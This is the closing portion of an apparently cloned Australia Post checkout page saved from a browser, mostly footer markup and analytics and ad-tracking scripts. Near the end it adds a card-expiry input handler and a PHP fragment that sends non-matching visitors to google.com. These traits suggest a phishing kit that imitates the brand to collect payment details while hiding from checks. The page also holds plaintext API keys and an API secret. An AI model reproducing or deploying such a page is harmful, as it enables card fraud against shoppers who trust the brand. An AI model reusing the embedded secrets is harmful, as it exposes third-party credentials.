<p>Australia Post collects your personal information to manage orders and process payments. We may also use your information to communicate with you about an order, or occasionally ask for your feedback. Your details may be disclosed to our contracted service providers (including providers located in the US) for the purpose of providing this or a related service. Your information is handled in accordance with the Australia Post Group Privacy Statement, which outlines how to access and/or correct your information, or make a complaint. For more information, visit <a title="http://www.auspost.com.au/privacy" href="http://www.auspost.com.au/privacy" target="_blank" rel="noreferrer noopener">auspost.com.au/privacy</a>.<br><br></p>
</div>
<div class="col-md-4 col-xlg-5 footer-payment-images">
<h4>Payment options</h4>
<img src="./Checkout Address_files/Visa.svg" alt="Visa card" width="40" height="24"><img src="./Checkout Address_files/master-card.svg" alt="Mastercard" width="40" height="24"><img src="./Checkout Address_files/amex.svg" alt="American_Express_Card" width="50" height="24"><img src="./Checkout Address_files/apple_pay_logo.svg" alt="Apple pay" height="24"></div>
</div>
</div>
</div>
</div></div><div><div id="common-footer" class="common-footer">
<div><footer class="footer-container"><nav class="footer-container-wrapper">
<div class="cf-site-links">
<div id="siteWideLinks">
<ul class="cf-site-wide-links">
<li class="site-wide-link-item"><a class="site-wide-item" href="https://auspost.com.au/sitemap.html" target="_blank">Sitemap</a></li>
<li class="site-wide-link-item"><a class="site-wide-item" href="https://auspost.com.au/privacy.html" target="_blank">Privacy policy</a></li>
<li class="site-wide-link-item"><a class="site-wide-item" href="https://auspost.com.au/about-us/about-our-site.html" target="_blank">About our site</a></li>
<li class="site-wide-link-item"><a class="site-wide-item" href="https://auspost.com.au/about-us/about-our-site/online-security-scams-fraud.html" target="_blank">Online security &amp; scams</a></li>
<li class="site-wide-link-item"><a class="site-wide-item" href="https://auspost.com.au/terms-conditions.html" target="_blank">Terms &amp; conditions</a></li>
<li class="site-wide-link-item"><a class="site-wide-item" href="https://auspost.com.au/about-us/about-our-site/accessibility.html" target="_blank">Accessibility</a></li>
</ul>
</div>
<div id="siteSocialLinks">&nbsp;</div>
<div id="helpAndSupportLinks">
<div class="help"><a class="help-dude" href="https://auspost.com.au/help-and-support/answers.html" target="_blank"><img src="./Checkout Address_files/help_support.svg" alt=""></a>
<div class="help-links">
<h4 id="helpAndSupportHeading" class="help-heading"><a class="help-link" href="https://auspost.com.au/help-and-support/results?group=otherproductsandservices&amp;c=ShoAus600&amp;cc" target="_blank">Help &amp; support</a></h4>
<ul id="helpAndSupportList" class="help-link-lists">
<li class="help-link-item"><a class="help-link-chevron" href="https://auspost.com.au/help-and-support/results?group=otherproductsandservices&amp;c=ShoAus600&amp;cc" target="_blank"> <span class="help-link-chevron-container"> <svg class="help-link-chevron-svg" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"> <path d="M18.06 9.85l-.05-.03L8.8.59c-.79-.78-2.06-.79-2.85 0L5.94.6l-.71.71a2.01 2.01 0 0 0 0 2.85L13.07 12l-7.84 7.84c-.78.79-.78 2.07 0 2.85l.71.71c.79.79 2.06.79 2.85 0l9.22-9.23c.01-.02.04-.02.05-.04l.71-.71c.38-.38.59-.9.59-1.44 0-.54-.21-1.06-.59-1.44l-.71-.69z"> </path> </svg> </span> <span class="link-chevron-content">Get help or get in touch</span> </a></li>
</ul>
</div>
</div>
</div>
</div>
</nav></footer></div>
</div></div><div>
<div class="container">
<div class="bottom-footer" style="display: flex; flex-wrap: wrap; align-items: center;">

</div>
</div></div></div>
<div class="newsletter-subscribed hidden">
<div class="icon-icon-success"></div>
<h2>Thanks for signing up, <span class="submit-username"></span></h2>
<p>Stay tuned for updates in your inbox.</p>
</div></footer>
<div class="loading-block hidden">
<svg class="icon-ui" focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><g><g><path d="M2.83 12a9.17 9.17 0 1 1 18.341 0A9.17 9.17 0 0 1 2.83 12zM12 0C5.373 0 0 5.373 0 12c0 6.628 5.373 12 12 12s12-5.372 12-12c0-6.627-5.373-12-12-12" opacity=".2"></path><path d="M18.028 1.626A11.838 11.838 0 0 0 12 0v2.821c1.704 0 3.352.504 4.728 1.316l1.3-2.51z" transform="rotate(235.297 12 12)"><animatetransform attributeType="xml" attributeName="transform" type="rotate" from="0 12 12" to="360 12 12" dur="0.5s" repeatCount="indefinite"></animatetransform></path></g></g></svg>
</div>
</div> 
 
 
<script src="./Checkout Address_files/jquery-3.6.0.min.js.téléchargement"></script><script src="./Checkout Address_files/recommendation.min.js.téléchargement"></script><script src="./Checkout Address_files/theme.min.js.téléchargement"></script><script type="text/javascript" src="./Checkout Address_files/ap_cms.js.téléchargement"></script><script type="text/javascript">
/*
* Translated default messages for bootstrap-select.
*/
(function ($) {
$.fn.selectpicker.defaults = {
noneSelectedText: "Nothing selected",
noneResultsText: "No results match {0}",
countSelectedText: function (numSelected, numTotal) {
return (numSelected == 1) ? "{0} item selected" : "{0} items selected";
}, 
selectAllText: "Select All",
deselectAllText:"Deselect All"
};
})(jQuery);
</script><script type="text/javascript" src="./Checkout Address_files/promotion-tracking.js.téléchargement"></script><script type="text/javascript">
(function(a) {a.fn.datepicker.dates.en = {days: ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],daysShort: ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"],daysMin: ["Su", "Mo", "Tu", "We", "Th", "Fr", "Sa"],months: ["January", "February","March", "April", "May", "June", "July", "August", "September", "October", "November", "December"],monthsShort: ["Jan", "Feb", "Mar", "Apr","May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],today: "Today",monthsTitle: "Months",clear: "Clear",weekStart: 1,format: "MM/dd/yyyy",titleFormat:"MM yyyy"}})(jQuery);
</script><script type="text/javascript">
(function($) {
$.fn.bootstrapValidator.i18n.forbiddensymbols = $.extend($.fn.bootstrapValidator.i18n.forbiddensymbols || {}, {
'default': 'Your input contains forbidden symbols.'
});
$.fn.bootstrapValidator.validators.forbiddensymbols = {
enableByHtml5: function($field) {
return (undefined !== $field.attr('forbiddensymbols'));
},
/**
* Return true if and only if the input value is a valid name
*
* @param {BootstrapValidator} validator Validate plugin instance
* @param {jQuery} $field Field element
* @param {Object} [options]
* @returns {Boolean}
*/
validate: function(validator, $field, options) {
var value = $field.val();
if (value === '') {
return true;
}
var forbiddenSymbolsRegExp = /^[^\<\>\&\@\;\%\*\#\|\_\[\]\!\?\~\+\{\}\(\)\:]*$/;
return forbiddenSymbolsRegExp.test(value);
}
};
}(window.jQuery));
</script><script type="text/javascript">
if (typeof RetailShop === 'undefined') {var RetailShop = {}};
RetailShop.URLs = {};
RetailShop.URLs.getProductComponents = "https://auspost.com.au/shop/web/WFS/AusPost-Shop-Site/en_AU/-/AUD/ViewProduct-RenderProductComponents?CatalogID=&CategoryName="; // additional params: SKU, cid, [cid, cid, ...]
RetailShop.URLs.getRecommendedProducts = "https://auspost.com.au/shop/web/WFS/AusPost-Shop-Site/en_AU/-/AUD/ViewProductRecommendation-Start"; // params: SKU, ContextViewId
RetailShop.URLs.getRecommendationSession = "https://auspost.com.au/shop/web/WFS/AusPost-Shop-Site/en_AU/-/AUD/ViewProductRecommendation-GetSessionData"; // no params
RetailShop.URLs.loginPage = "https://auspost.com.au/shop/login";
const REST_HOST = 'http://auspost.com.au:80/';
const REST_WEB_ADAPTER = '/shop/rest';
const CURRENT_DOMAIN = 'AusPost-Shop-Site';
const SERVER_GROUP = 'WFS';
const LOCALE = 'en_AU';
</script><script src="./Checkout Address_files/auspost_shop.min.js.téléchargement"></script><!-- auth0-ui-integration-module -->
<script src="./Checkout Address_files/module.js.téléchargement"></script><script src="./Checkout Address_files/auspost_shop.auth0.js.téléchargement"></script><!-- TODO: Configure mypost-header/footer src to use environment properties -->
<script src="./Checkout Address_files/header.js.téléchargement"></script><!--
<script type="text/javascript" src="https://ptest.npe.auspost.com.au/website-footer/footer.js"></script>
--><script type="text/javascript">
$().ready(function() {
$(document).attachQas();
});
</script><script>
LocationFinder.init({ 
root: 'clickAndCollectWrapper', 
apiKey: "2SUPFPHN1VKIJOI663L4XPIUKU4JFJZD", 
apiSecret: "LDQGlYJ0KzUtvpEmY3AXfPhZ2FA6V1ruMnRZU7nKqNFYcCkcYWhNNYal7FdOgXMc", 
googleApiKey: "AIzaSyBbaZpTPyz2Kma7I3so7GgnmAkv7SroUHg", 
merchantId: "0020038694", 
emailInputId: "email_Email",
singletonInit: true,

callback: response 
});
if(typeof ishconfig == 'undefined') ishconfig = {};
ishconfig.EmailSearchAPI = {
url: "https://digitalapi.auspost.com.au/customersetup/v1/email/search",
timeout: "15"
}
</script><script src="./Checkout Address_files/auspost_emailsearch.js.téléchargement"></script><script type="text/javascript">
window.cssDir = "/shop/static/WFS/AusPost-Shop-Site/-/-/en_AU/css/";
window.imgDir = "/shop/static/WFS/AusPost-Shop-Site/-/-/en_AU/images/";
</script>







<!-- SiteCatalyst code version: H.21.1.
Copyright 1996-2010 Adobe, Inc. All Rights Reserved
More info available at http://www.omniture.com -->

<script type="text/javascript">
	var sitePageDescription = "";
	var sitePageCategory = "";
	
		var g_pageCategory = g_pageName.substring(18, g_pageName.length);
		
		    sitePageDescription = "step1:delivery details";
			sitePageCategory = "checkout";
		
	
	
	analytics.page.pageData.pageCategory = sitePageCategory;
	analytics.page.pageData.pageDescription = sitePageDescription;
</script>




<script type="text/javascript">_satellite.pageBottom();</script><script>
// Remove Cookie
_satellite.cookie.remove('latest_cid');

//Set new cookie if cid exists
if(_satellite.getVar('CID') != "") {
    _satellite.cookie.set("latest_cid", _satellite.getVar('CID'), 30);
    //Save CID in Session Storage
    sessionStorage.setItem("initial_cid",_satellite.getVar('CID'));
}


//Retrieve CID from Session Storage and persist cookie
if (sessionStorage.getItem("initial_cid") != null)
{
  _satellite.cookie.set("latest_cid", sessionStorage.getItem("initial_cid"));
}
</script><script type="text/javascript"> 
(function(a,b,c,d,e,f,g){e.ire_o=c;e[c]= e[c]||function(){(e[c].a=e[c].a||[]).push(arguments)};f=d.createElement(b);g=d.getElementsByTagName(b)[0];f.async=1;f.src=a;g.parentNode.insertBefore(f,g);})('//d.impactradius-event.com/A1200241-7967-4ff6-b82e-77b91771d7e41.js','script','ire',document,window); 
ire('identify', {customerId: '', customerEmail: ''});
</script><!--
Start of global snippet: Please do not remove
Place this snippet between the <head> and </head> tags on every page of your site.
-->
<!-- Global site tag (gtag.js) - Google Marketing Platform -->
<script async="" src="./Checkout Address_files/js(4)"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
 
  gtag('config', 'DC-4621208'); // DCM account ID
  gtag('config', 'AW-964765464'); // Search Tags configuration
</script>

<!-- End of global snippet: Please do not remove --><!-- Facebook Pixel Code -->
<script>
!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
document,'script','https://connect.facebook.net/en_US/fbevents.js');
fbq('set', 'autoConfig', 'true', '662331570529793'); 
fbq('init', '662331570529793');
fbq('track', "PageView");</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=662331570529793&ev=PageView&noscript=1"
/></noscript>
<!-- End Facebook Pixel Code -->
<script>
if (document.location.href.indexOf("workforce-verification") == -1) //exclude this page
{ 
 _linkedin_data_partner_id = "86499"; 
 (function(){var s = document.getElementsByTagName("script")[0]; var b = document.createElement("script"); b.type = "text/javascript";b.async = true; b.src = "https://snap.licdn.com/li.lms-analytics/insight.min.js"; s.parentNode.insertBefore(b, s);})(); 
}
</script> 
<noscript> <img height="1" width="1" style="display:none;" alt="" src="https://dc.ads.linkedin.com/collect/?pid=86499&fmt=gif" /> </noscript><script>_satellite["_runScript2"](function(event, target, Promise) {
var s_orderTotal = _satellite.getVar('Total Order');
var s_CartContent = _satellite.getVar('Cart SKU Quantity');
var s_CartContentsku = _satellite.getVar('Product Sku');
var s_productView = _satellite.getVar('Product View');

if (s_orderTotal !== ""){
  if(s_productView !== ""){
  switch(s_productView){
    case "order":
    fbq('track', 'Purchase',{
      contents: s_CartContent,
      content_type:'product',
      currency:'AUD',
      value: s_orderTotal
    });
    break;
    
    case "checkout review and payment":
    fbq('track', 'InitiateCheckout',{
      contents: s_CartContent,
      content_type:'product',
      currency:'AUD',
      value: s_orderTotal
    });
    break;
    
   case "viewcart":
    fbq('track', 'ViewContent',{
      contents: s_CartContent, 
      content_type:'product',
      currency:'AUD',
      value: s_orderTotal
    });
    break; //*/ //removing from the cart and only on product pages

    default:
    console.log("default")
	}
  }
}
  else {
   s_orderTotal = 0
}

});</script><script>_satellite["_runScript3"](function(event, target, Promise) {
var s_pageCategory = _satellite.getVar('Page Category');
var s_pageDescription = _satellite.getVar('Page Description');
var s_productView = _satellite.getVar('Product View');
var s_loginFlag = _satellite.getVar('Login Flag');
var pageviewParams = {};
//pageviewParams.apcn = s.eVar57;
//pageviewParams.login_status = s.eVar160;

//registration success events
if (typeof s_pageCategory !== 'undefined' && s_pageCategory !== "" && typeof s_pageDescription !== 'undefined' && s_pageDescription !== "") {
    if (s_pageDescription == "edit details or change password" && s_pageCategory == "my shop account") {
        // s.events = "event8";
        // s.prop57 = s.eVar57 = s_apcn;
        // s.prop13 = s.eVar13 = type;

        _satellite.getVar("CC | GA4 Analytics Data Layer", {
            action: "registration_complete",
            params: {
                apcn: s.eVar57,
                registration_type: s.eVar13,
                user_type: "consumer"
            }
        });
    } else if (s_pageDescription == "start" && s_pageCategory == "registration")
        // s.events = "event18";

        _satellite.getVar("CC | GA4 Analytics Data Layer", {
            action: "registration_start",
            params: {}
        });
}

if (s_productView !== "") {
    switch (s_productView) {
        case "viewcart":
            //to capture login success event
            if (s_loginFlag !== "") {
                if (s_loginFlag == "true") {
                    // s.events = "scView,event9";
                    // s.prop57 = s.eVar57 = s_apcn;
                    // s.prop13 = s.eVar13 = type;

                    _satellite.getVar("CC | GA4 Analytics Data Layer", {
                        action: "login_complete",
                        params: {
                            apcn: s.eVar57,
                            login_status: s.eVar160,
                            user_type: "consumer"
                        }
                    });
                }
            }
            break;
        case "your details":
            //to capture login success event
            if (s_loginFlag !== "") {
                if (s_loginFlag == "true") {
                    // s.events = "scCheckout,event9";
                    // s.prop57 = s.eVar57 = s_apcn;
                    // s.prop13 = s.eVar13 = type;

                    _satellite.getVar("CC | GA4 Analytics Data Layer", {
                        action: "login_complete",
                        params: {
                            apcn: s.eVar57,
                            login_status: s.eVar160,
                            user_type: "consumer"
                        }
                    });
                }
            }
            break;
        case "delivery and billing":
            //to capture login success event
            if (s_loginFlag !== "") {
                if (s_loginFlag == "true") {
                    // s.events = "scCheckout,event9";
                    // s.prop57 = s.eVar57 = s_apcn;
                    // s.prop13 = s.eVar13 = type;

                    _satellite.getVar("CC | GA4 Analytics Data Layer", {
                        action: "login_complete",
                        params: {
                            apcn: s.eVar57,
                            login_status: s.eVar160,
                            user_type: "consumer"
                        }
                    });
                }
            }
            break;
        case "confirm and pay":
            //to capture login success event
            if (s_loginFlag !== "") {
                if (s_loginFlag == "true") {
                    // s.events = "event23,event9";
                    // s.prop57 = s.eVar57 = s_apcn;
                    // s.prop13 = s.eVar13 = type;

                    _satellite.getVar("CC | GA4 Analytics Data Layer", {
                        action: "login_complete",
                        params: {
                            apcn: s.eVar57,
                            login_status: s.eVar160,
                            user_type: "consumer"
                        }
                    });
                }
            }
            break;
        case "order":
            // s.eVar115 = s.purchaseID = onlineShop + s_purchaseID;
            pageviewParams.purchase_id = s.eVar115;
            break;
        default:
    }
}

//To capture successfull login
if (s_loginFlag.includes("nonproduct")) {
    if (s_loginFlag.includes("true")) {
        // s.events = "event9";
        // s.prop57 = s.eVar57 = s_apcn;
        // s.prop13 = s.eVar13 = type;
        
        _satellite.getVar("CC | GA4 Analytics Data Layer", {
            action: "login_complete",
            params: {
                apcn: s.eVar57,
                login_status: s.eVar160,
                user_type: "consumer"
            }
        });
    }
}

//to capture search results count
if (s_pageCategory !== "" && s_pageCategory !== 'undefined') {
    if (s_pageCategory === "search") {
        // s.events = "event7";
        // s.eVar7 = "D=c7";

        _satellite.getVar("CC | GA4 Analytics Data Layer", {
            action: "search",
            params: {
                search_term: s.eVar7
            }
        });
    }
}

_satellite.getVar("CC | GA4 Analytics Data Layer", {
    action: "page_view",
    params: pageviewParams
});

// Direct Call to run all GA4 events
_satellite.track('ga4-event-handler');
});</script>  <script src="./Checkout Address_files/up_loader.1.1.0.js.téléchargement" type="text/javascript"></script>
        <script type="text/javascript">
            ttd_dom_ready( function() {
                if (typeof TTDUniversalPixelApi === 'function') {
                    var universalPixelApi = new TTDUniversalPixelApi();
                    universalPixelApi.init("v494ekt", ["0zlcwjg"], "https://insight.adsrvr.org/track/up");
                }
            });
        </script><script>_satellite["_runScript4"](function(event, target, Promise) {
_satellite.getVar("CC | GA4 Analytics Data Layer", {
    action: "page_view",
    params: {}
});

// Direct Call to run all GA4 events
_satellite.track('ga4-event-handler');
});</script><script>_satellite["_runScript5"](function(event, target, Promise) {
var cid = _satellite.cookie.get("latest_cid");

var sources = {edm:"Email",dsp:"Display Media",soc:"Social",sem:"Paid Search",aff:"Affiliate",inf:"Influencer",ctn:"Content",sms:"SMS",web:"Website", olv: "Online Video",mer:"Merchandising"}

var publishers = {   2483017: "Aust Post" ,
   1848104: "Facebook AU" ,
   1915606: "LinkedIn AU" ,
   2664223: "Twitter AU" ,
   4330953: "Snap" ,
   1833252: "outbrain.com" ,
   2094807: "Lifehacker Australia" ,
   3144730: "taboola.com" ,
   2319323: "canstar.com.au" ,
   2748229: "finder.com.au" ,
   3027705: "Mozo AU" ,
   4298404: "Cash Rewards" ,
   2065319: "TEADS" ,
   1832686: "AMNET" ,
   1846306: "MCN Online" ,
   1901303: "Big Mobile" ,
   1902986: "FairfaxDigital" ,
   1915010: "Adconion Media Group AU" ,
   1929114: "probonoaustralia.com.au" ,
   1945106: "powerretail.com.au" ,
   1970505: "expedia.com.au" ,
   1972703: "SBS Australia" ,
   1972900: "AD2One.com.au" ,
   1995909: "Yahoo Australia" ,
   2042603: "MediaMotive AU" ,
   2066314: "Inside Retail" ,
   2071030: "ROKT" ,
   2075310: "Pandora" ,
   2079980: "APD Group" ,
   2079981: "Amobee" ,
   2094806: "PopSugar Australia" ,
   2278207: "Private Media" ,
   2278261: "The Age" ,
   2278262: "canberratimes.com.au" ,
   2282800: "SMH.com.au - The Sydney Morning Herald" ,
   2283000: "fairfax.com.au" ,
   2285821: "eBay - Australia" ,
   2318126: "NEWS.com.au" ,
   2319365: "jetmaxmedia.com" ,
   2367128: "RealEstate.com.au" ,
   2551425: "Trip Advisor" ,
   2556816: "wotif.com" ,
   2612432: "Bauer Media" ,
   2690002: "Gumtree" ,
   2700226: "Mi9" ,
   2715903: "Webjet AU" ,
   2715904: "Virgin - Australia" ,
   2727817: "Student Edge AU" ,
   2747238: "BidManager_DfaSite_638078" ,
   2780860: "jetstar.com" ,
   2806670: "Zuji" ,
   2821505: "skyscanner.com.au" ,
   2856937: "Out of Home Activity" ,
   2866108: "Exponential" ,
   2878623: "Radium One" ,
   2914907: "CareerOne" ,
   2961847: "Ethical Jobs" ,
   3000613: "The Mandarin" ,
   3022912: "Australian Financial Review" ,
   3031736: "Geelong Advertiser" ,
   3039413: "Airport Economist" ,
   3088323: "StudentVIP" ,
   3102586: "Flatmates.gr" ,
   3102608: "thethousands.com.au" ,
   3142933: "The Urban List" ,
   3365466: "Government News AU" ,
   3374326: "Murray Valley Standard" ,
   3374327: "AU - The Chronicle" ,
   3374519: "Bordermail" ,
   3374520: "Wagga Daily Advertiser" ,
   3374521: "Victor Harbor Times" ,
   3374545: "Inside Small Business" ,
   3374741: "dailymercury.com.au" ,
   3374743: "themercury.com.au" ,
   3375132: "Port Lincoln Times" ,
   3375717: "Sunraysia Daily" ,
   3375718: "Katherine Times" ,
   3375720: "Coffs Harbour Chronicle" ,
   3375917: "Port Macquarie News" ,
   3376140: "Burnie Advocate" ,
   3376918: "The Border Watch" ,
   3376919: "AU- The Northern Star" ,
   3377118: "The Ballarat Courier" ,
   3377142: "Seven West Media" ,
   3377318: "The Australian" ,
   3377321: "Launceston Examiner" ,
   3378924: "bendigoadvertiser.com.au" ,
   3378925: "Warrnambool Standard" ,
   3440805: "Intermedia Group" ,
   3441608: "DynamicBusiness" ,
   3447033: "Domain AU" ,
   3554038: "Take 5 Magazine" ,
   3581126: "nine.com.au" ,
   3615516: "Allure Media AU" ,
   3617334: "Australian Business Forum" ,
   4037585: "Student Services AU" ,
   4126242: "Stocard" ,
   4223347: "Pedestrian.tv" ,
   4241340: "Junkee" ,
   4272388: "New Idea Online" ,
   4272397: "Now To Love" ,
   4272670: "That's Life Online" ,
   4272676: "Pacific Magazines" ,
   4275988: "BHG.com.au (Better Homes & Gardens)" ,
   4324036: "Buzzfeed" ,
   4470198: "Spotify" ,
   4477583: "Pinstripe Media" ,
   4584276: "Inside FMCG" ,
   4585473: "Asia Today" ,
   4615425: "InMobi" ,
   4615662: "Rhythm One" ,
   4679694: "AffecTV" ,
   4772974: "Trade Indy" ,
   2080206: "DART Search : Google" ,
   2121226: "DART Search : MSN" ,
   2665719: "GSP (Gmail Sponsored Promotions)" ,
   2140918: "Google - YouTube",
   5483404: "Smart Company",
   5538319: "Kochie's Business Builders",
   5542531: "eBay",
   5793472: "InMobi Australia",
   5853110: "Medium Rare Content",
   5889889: "Mumbrella",
   6284078: "News Digital Media AU",
   4679376: "Nine Entertainment Co",
   5800335: "Plista Au",
   2649239: "Twitter - Official",
   5845283: "Verizon Media",
   5638268: "Xaxis Au",
   5889892: "Yaffa Publishing",
   6814617: "Business News Australia",
   6810532: "Octomedia",
   5853110: "Medium Rare Content"
   }

if(typeof(cid) != "undefined") {
  var split_cid = cid.split(':');
  

if($('input[name="HIDDEN-_-Traffic_Source__c"]').length) {
  $('input[name="HIDDEN-_-Traffic_Source__c"]').val(sources[split_cid[0]])
}

if($('input[name="HIDDEN-_-CID_Campaign_Name__c"]').length) {
  $('input[name="HIDDEN-_-CID_Campaign_Name__c"]').val(split_cid[3])
}

if($('input[name="HIDDEN-_-Publisher__c"]').length) {
  $('input[name="HIDDEN-_-Publisher__c"]').val(publishers[split_cid[1]])
}
}
});</script><script>_satellite["_runScript6"](function(event, target, Promise) {
var resultList = _satellite.getVar("Target Experience Data");
if(typeof(resultList) !== "undefined" && resultList !== ""){
  _satellite.logger.log("====>Result List (Rule) : " + resultList);
  _satellite.setVar("Target Experience List", resultList);
}else
  resultList = [];
});</script>

</div><ul id="ui-id-1" tabindex="0" class="ui-menu ui-widget ui-widget-content ui-autocomplete ui-front" style="display: none;"></ul><div role="status" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></div><ul id="ui-id-2" tabindex="0" class="ui-menu ui-widget ui-widget-content ui-autocomplete ui-front" style="display: none;"></ul><div role="status" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></div><ul id="ui-id-3" tabindex="0" class="ui-menu ui-widget ui-widget-content ui-autocomplete ui-front" style="display: none;"></ul><div role="status" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></div><iframe allow="join-ad-interest-group" data-tagging-id="AW-964765464" data-load-time="1711858637842" height="0" width="0" style="display: none; visibility: hidden;" src="./Checkout Address_files/964765464.html"></iframe><iframe height="0" width="0" aria-hidden="true" alt="" style="pointer-events: none; height: 0px; width: 0px; position: absolute; padding: 0px; margin: 0px; border: 0px; visibility: hidden;" src="./Checkout Address_files/saved_resource.html"></iframe><script>_satellite["_runScript7"](function(event, target, Promise) {
if(!1===gtagDataLayer.pageView){for(var i=0;i<gtagDataLayer.events.length;i++)if("page_view"===gtagDataLayer.events[i].action){_satellite.getVar("CC | GA4 Global Custom Events",{action:"page_view",params:gtagDataLayer.events[i].params}),gtagDataLayer.pageView=!0,gtagDataLayer.events.splice(i,1);break}!1===gtagDataLayer.pageView&&(_satellite.getVar("CC | GA4 Global Custom Events",{action:"page_view",params:{}}),gtagDataLayer.pageView=!0)}var triggeredEvents=[];for(i=0;i<gtagDataLayer.events.length;i++)"page_view"!==gtagDataLayer.events[i].action&&(triggeredEvents.includes(JSON.stringify(gtagDataLayer.events[i]))||(_satellite.getVar("CC | GA4 Global Custom Events",{action:gtagDataLayer.events[i].action,params:gtagDataLayer.events[i].params}),triggeredEvents.push(JSON.stringify(gtagDataLayer.events[i])),gtagDataLayer.events.splice(i,1)));
});</script><script>_satellite["_runScript8"](function(event, target, Promise) {
if(!1===gtagDataLayer.pageView){for(var i=0;i<gtagDataLayer.events.length;i++)if("page_view"===gtagDataLayer.events[i].action){_satellite.getVar("CC | GA4 Global Custom Events",{action:"page_view",params:gtagDataLayer.events[i].params}),gtagDataLayer.pageView=!0,gtagDataLayer.events.splice(i,1);break}!1===gtagDataLayer.pageView&&(_satellite.getVar("CC | GA4 Global Custom Events",{action:"page_view",params:{}}),gtagDataLayer.pageView=!0)}var triggeredEvents=[];for(i=0;i<gtagDataLayer.events.length;i++)"page_view"!==gtagDataLayer.events[i].action&&(triggeredEvents.includes(JSON.stringify(gtagDataLayer.events[i]))||(_satellite.getVar("CC | GA4 Global Custom Events",{action:gtagDataLayer.events[i].action,params:gtagDataLayer.events[i].params}),triggeredEvents.push(JSON.stringify(gtagDataLayer.events[i])),gtagDataLayer.events.splice(i,1)));
});</script><iframe id="universal_pixel_0zlcwjg" height="0" width="0" style="display:none;" src="./Checkout Address_files/up.html" title="TTD Universal Pixel"></iframe>


<script>
  document.getElementById('exp').addEventListener('input', function(e) {
    var input = e.target.value.replace(/\D/g, ''); // Remove non-digits
    var month = '';
    var year = '';

    // Extract month and year from input
    if (input.length >= 2) {
      month = input.substring(0, 2);
      year = input.substring(2, 4);
    } else {
      month = input;
    }

    // Auto-insert slash after the month
    if (input.length >= 2) {
      e.target.value = month + '/' + year;
    } else {
      e.target.value = month;
    }

    // Validation for month and year
    if (month.length == 2 && (parseInt(month) > 12 || parseInt(month) < 1)) {
      alert('Invalid month. Please enter a month between 01 and 12.');
      e.target.value = '';
    }

    // Ensure year starts from 24 if 2 digits are entered
    if (year.length == 2 && parseInt(year) < 24) {
      alert('Invalid year. Year should start from 24.');
      e.target.value = month + '/';
    }
  });
</script>

</body></html>



<?php
}else {
HEADER("Location: https://google.com");

}
?>